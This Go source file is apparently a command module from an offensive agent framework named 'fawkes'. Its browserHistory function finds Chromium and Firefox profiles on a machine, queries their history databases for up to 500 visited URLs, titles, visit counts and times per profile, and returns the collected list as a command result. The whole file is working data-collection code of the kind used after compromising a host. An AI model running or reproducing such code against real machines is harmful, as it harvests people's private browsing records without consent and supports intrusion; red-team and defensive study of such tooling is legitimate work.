package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// browserHistory extracts browsing history from Chromium-based browsers.
// Calls platform-specific browserPaths() and openBrowserDB().
func browserHistory(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	type historyEntry struct {
		Browser    string
		URL        string
		Title      string
		VisitCount int
		LastVisit  string
	}

	var allEntries []historyEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		var profiles []string
		var dbFile, query string
		var timeConvert func(int64) string

		if isFirefoxBrowser(browserName) {
			profiles = findFirefoxProfiles(userDataDir)
			dbFile = "places.sqlite"
			query = "SELECT url, title, visit_count, last_visit_date FROM moz_places WHERE visit_count > 0 ORDER BY last_visit_date DESC LIMIT 500"
			timeConvert = firefoxTimeToString
		} else {
			profiles = findProfilesWithFile(userDataDir, "History")
			dbFile = "History"
			query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500"
			timeConvert = chromeTimeToString
		}

		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, dbFile)
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query(query)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
				cleanup()
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var url, title string
				var visitCount int
				var lastVisitTime int64

				if err := rows.Scan(&url, &title, &visitCount, &lastVisitTime); err != nil {
					continue
				}

				allEntries = append(allEntries, historyEntry{
					Browser:    label,
					URL:        url,
					Title:      title,
					VisitCount: visitCount,
					LastVisit:  timeConvert(lastVisitTime),
				})
			}
			if err := rows.Err(); err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): iteration: %v", browserName, profileName, err))
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser History (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		title := e.Title
		if title == "" {
			title = "(no title)"
		}
		sb.WriteString(fmt.Sprintf("[%s] %s\n  %s  (visits: %d, last: %s)\n",
			e.Browser, truncStr(title, 80), truncStr(e.URL, 120), e.VisitCount, e.LastVisit))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}
